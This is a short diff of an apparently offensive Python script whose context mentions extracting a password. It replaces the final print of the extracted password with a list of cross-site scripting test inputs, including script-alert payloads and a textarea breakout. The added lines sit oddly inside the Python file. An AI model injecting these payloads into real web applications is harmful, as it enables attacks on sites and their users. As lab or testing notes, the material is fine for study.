@@ -65,4 +65,13 @@ except KeyboardInterrupt:
 except Exception as e:
     print(f"An error occurred: {e}")
 
-print(f"Extracted password: {password}")
+
+
+    XSS 1
+      <input type="text">
+    XSS 2
+      <script>alert("PWNED")</script>
+    XSS 3
+      same
+    XSS 4
+      </textarea><script>alert("PWNED")</script>
